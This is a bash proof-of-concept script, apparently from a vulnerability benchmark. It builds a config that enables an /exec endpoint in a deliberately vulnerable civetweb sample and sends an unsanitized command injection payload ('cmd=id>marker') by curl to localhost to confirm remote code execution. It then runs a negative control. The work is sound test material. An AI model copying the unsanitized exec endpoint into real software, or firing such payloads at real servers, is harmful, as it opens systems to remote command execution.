#!/usr/bin/env bash
# PoC for 147_civetweb_C2I1S1
# Axes: C2 (config file gate) / I1 (direct to system()) / S1 (no sanitization)
#
# Negative control: start without --config; exec_cfg stays {0,0,""}, /exec returns 404.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/civetweb"
WWWROOT="/tmp/poc_147_www"
MARKER="/tmp/poc_147_marker"
CONFIG="/tmp/poc_147.conf"
PORT=18147
NEG_PORT=19147

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONFIG"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# write config file
cat > "$CONFIG" <<'EOF'
exec_mode = 1
exec_logging = 1
EOF

# start server with config
echo "[*] starting civetweb with --config $CONFIG on port $PORT..."
"$BINARY" --config "$CONFIG" \
    -listening_ports "$PORT" \
    -document_root "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# trigger exploit -- I1: direct, S1: no sanitization
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
sleep 0.2

# verify
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# negative control: start without --config
echo "[*] verifying gate: endpoint absent without --config..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
"$BINARY" \
    -listening_ports "$NEG_PORT" \
    -document_root "$WWWROOT" &
SERVER_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
